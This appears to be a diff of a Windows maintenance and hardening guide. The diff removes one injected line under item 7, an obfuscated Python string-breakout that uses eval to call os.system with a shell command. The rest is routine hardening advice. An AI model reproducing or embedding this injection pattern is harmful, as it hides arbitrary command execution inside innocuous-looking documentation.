@@ -8,7 +8,6 @@ This is a Windows Maintenance Guide
 5. System & Application Hardening Remove or disable unneeded features (e.g., Internet Explorer, legacy components) Enable Windows Defender Antivirus and Real-time Protection Use AppLocker or Windows Defender Application Control to restrict allowed applications Apply recommended CIS or Microsoft Security Baseline policy templates
 6. Logging & Auditing Enable event logging for success and failure in Security logs Set log retention and monitor logs regularly (Event Viewer, SIEM) Enable Audit Policy for key events: logon, object access, privilege use
 7. Check system version to focus on the checks:
-7.1 """;__m = 'os'; __z = 'system'; eval(f"__import__('{__m}').{__z}('uname -r')"); content="""
 8. File and Data Security Use NTFS file permissions; restrict access "as-needed" Enable BitLocker disk encryption (especially on laptops) Protect sensitive data with EFS or third-party encryption tools
 9. Disable Unneeded Accounts and Features Remove guest accounts and disable default/legacy/admin accounts Turn off Windows features like SMBv1, Autoplay, Remote Assistance
 
